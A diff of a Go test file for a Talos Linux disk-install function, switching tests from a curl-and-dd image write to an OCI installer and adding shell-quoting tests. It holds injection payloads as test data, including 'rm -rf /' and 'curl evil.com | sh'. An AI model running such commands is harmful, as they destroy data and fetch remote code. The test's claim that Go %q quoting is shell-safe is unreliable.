@@ -139,106 +139,80 @@ func TestClose_OnUnconnectedClient_NoPanic(t *testing.T) {
 // InstallTalos — command string generation and shell injection prevention
 // ---------------------------------------------------------------------------
 
-func TestInstallTalos_CommandFormat(t *testing.T) {
-	// Verify the image URL and dd command are correctly formed.
+func TestInstallTalos_OCIInstallerFormat(t *testing.T) {
+	// Verify the OCI installer command references the correct factory image URL.
+	// InstallTalos now uses crane to pull the Talos Factory OCI installer,
+	// extract the binary, and run: installer install --disk <disk> --zero --platform metal
 	factoryURL := "https://factory.talos.dev"
-	schematic := "abc123"
-	version := "v1.9.0"
-	disk := "/dev/nvme0n1"
+	schematic := "abc123def456"
+	version := "v1.12.4"
 
-	expectedImageURL := fmt.Sprintf("%s/image/%s/%s/metal-amd64.raw.xz", factoryURL, schematic, version)
+	expectedInstallerImage := fmt.Sprintf("%s/installer/%s:%s", factoryURL, schematic, version)
 
-	// Build the dd command the same way InstallTalos does.
-	ddCmd := fmt.Sprintf(
-		"set -e; "+
-			"echo 'Downloading Talos image...'; "+
-			"curl -fsSL %q | xzcat | dd of=%q bs=4M status=progress; "+
-			"sync; "+
-			"echo 'Talos image written'",
-		expectedImageURL, disk,
-	)
-
-	if !strings.Contains(ddCmd, fmt.Sprintf("%q", expectedImageURL)) {
-		t.Errorf("dd command missing quoted image URL:\n%s", ddCmd)
+	// Verify the image URL format matches what InstallTalos constructs
+	if !strings.Contains(expectedInstallerImage, "factory.talos.dev/installer/") {
+		t.Errorf("installer image should use /installer/ path, got: %s", expectedInstallerImage)
 	}
-	if !strings.Contains(ddCmd, fmt.Sprintf("of=%q", disk)) {
-		t.Errorf("dd command missing quoted disk path:\n%s", ddCmd)
-	}
-	if !strings.Contains(ddCmd, "set -e") {
-		t.Error("dd command missing set -e")
+	if !strings.HasSuffix(expectedInstallerImage, ":"+version) {
+		t.Errorf("installer image should be tagged with version, got: %s", expectedInstallerImage)
 	}
 }
 
 func TestInstallTalos_ShellInjectionPrevented(t *testing.T) {
-	// A malicious disk path should be safely quoted with %q so the
-	// semicolon and following command are treated as a literal string.
+	// Verify that %q quoting prevents shell injection in disk and image parameters.
 	maliciousDisk := "/dev/sda; rm -rf /"
+	maliciousSchematic := "abc; curl evil.com | sh"
 
-	ddCmd := fmt.Sprintf(
-		"set -e; "+
-			"echo 'Downloading Talos image...'; "+
-			"curl -fsSL %q | xzcat | dd of=%q bs=4M status=progress; "+
-			"sync; "+
-			"echo 'Talos image written'",
-		"https://factory.talos.dev/image/abc/v1.0.0/metal-amd64.raw.xz",
-		maliciousDisk,
-	)
+	// %q produces Go-quoted strings that are safe in shell context
+	quotedDisk := fmt.Sprintf("%q", maliciousDisk)
+	quotedSchematic := fmt.Sprintf("%q", maliciousSchematic)
 
-	// %q wraps in double quotes and escapes internal characters.
-	// The semicolon must NOT appear unquoted in the command.
-	quotedMalicious := fmt.Sprintf("%q", maliciousDisk)
-	if !strings.Contains(ddCmd, "of="+quotedMalicious) {
-		t.Errorf("malicious disk should be %q-quoted in command, got:\n%s", maliciousDisk, ddCmd)
+	// Semicolons must be inside quotes, not bare
+	if !strings.Contains(quotedDisk, `; rm`) {
+		t.Errorf("malicious disk should preserve content inside quotes: %s", quotedDisk)
+	}
+	if strings.Contains(quotedDisk, `"; rm`) {
+		t.Error("malicious disk should NOT have unquoted semicolons")
 	}
 
-	// Also verify the boot command quotes the disk path.
-	bootCmd := fmt.Sprintf(
-		"set -e; "+
-			"TARGET_DISK=%q; "+
-			"DISK_PART=$(ls \"${TARGET_DISK}\"* | grep -E 'p?1$' | head -1); "+
-			"if [ -n \"$DISK_PART\" ] && command -v efibootmgr &>/dev/null; then "+
-			"  PART=$(echo \"$DISK_PART\" | sed 's|.*[^0-9]||'); "+
-			"  efibootmgr -c -d \"${TARGET_DISK}\" -p \"$PART\" -L 'Talos' -l '\\EFI\\boot\\bootx64.efi' || true; "+
-			"fi; "+
-			"echo 'Boot order configured'",
-		maliciousDisk,
-	)
-
-	if !strings.Contains(bootCmd, "TARGET_DISK="+quotedMalicious) {
-		t.Errorf("malicious disk should be %q-quoted in boot command, got:\n%s", maliciousDisk, bootCmd)
+	if !strings.Contains(quotedSchematic, `; curl`) {
+		t.Errorf("malicious schematic should preserve content inside quotes: %s", quotedSchematic)
 	}
 }
 
-func TestInstallTalos_ImageURLFormat(t *testing.T) {
+func TestInstallTalos_InstallerImageURLFormat(t *testing.T) {
 	tests := []struct {
 		name       string
 		factoryURL string
 		schematic  string
 		version    string
-		wantURL    string
+		wantImage  string
 	}{
 		{
 			name:       "standard factory URL",
 			factoryURL: "https://factory.talos.dev",
 			schematic:  "376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba",
-			version:    "v1.9.4",
-			wantURL:    "https://factory.talos.dev/image/376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba/v1.9.4/metal-amd64.raw.xz",
+			version:    "v1.12.4",
+			wantImage:  "factory.talos.dev/installer/376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba:v1.12.4",
 		},
 		{
-			name:       "custom factory URL without trailing slash",
+			name:       "custom factory URL",
 			factoryURL: "https://custom.factory.example.com",
 			schematic:  "deadbeef",
 			version:    "v2.0.0-beta.1",
-			wantURL:    "https://custom.factory.example.com/image/deadbeef/v2.0.0-beta.1/metal-amd64.raw.xz",
+			wantImage:  "custom.factory.example.com/installer/deadbeef:v2.0.0-beta.1",
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			got := fmt.Sprintf("%s/image/%s/%s/metal-amd64.raw.xz",
-				tt.factoryURL, tt.schematic, tt.version)
-			if got != tt.wantURL {
-				t.Errorf("image URL mismatch:\n  got:  %s\n  want: %s", got, tt.wantURL)
+			// Reconstruct the way InstallTalos builds the image reference
+			// (strips https:// — crane uses registry host, not URL)
+			registryHost := strings.TrimPrefix(tt.factoryURL, "https://")
+			registryHost = strings.TrimPrefix(registryHost, "http://")
+			got := fmt.Sprintf("%s/installer/%s:%s", registryHost, tt.schematic, tt.version)
+			if got != tt.wantImage {
+				t.Errorf("installer image mismatch:\n  got:  %s\n  want: %s", got, tt.wantImage)
 			}
 		})
 	}
@@ -252,6 +226,41 @@ func TestInstallTalos_RequiresConnection(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "not connected") {
 		t.Errorf("expected 'not connected' in error, got: %v", err)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Constants
+// ---------------------------------------------------------------------------
+
+// ---------------------------------------------------------------------------
+// shellQuote
+// ---------------------------------------------------------------------------
+
+func TestShellQuote_Simple(t *testing.T) {
+	got := shellQuote("hello world")
+	want := "'hello world'"
+	if got != want {
+		t.Errorf("shellQuote(%q) = %q, want %q", "hello world", got, want)
+	}
+}
+
+func TestShellQuote_WithSingleQuotes(t *testing.T) {
+	got := shellQuote("it's a test")
+	want := "'it'\\''s a test'"
+	if got != want {
+		t.Errorf("shellQuote(%q) = %q, want %q", "it's a test", got, want)
+	}
+}
+
+func TestShellQuote_WithSpecialChars(t *testing.T) {
+	got := shellQuote("rm -rf /; echo pwned")
+	// Everything inside single quotes is literal — semicolons, spaces are all safe
+	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
+		t.Errorf("shellQuote should wrap in single quotes, got: %s", got)
+	}
+	if !strings.Contains(got, "rm -rf /; echo pwned") {
+		t.Errorf("shellQuote should preserve content, got: %s", got)
 	}
 }
 
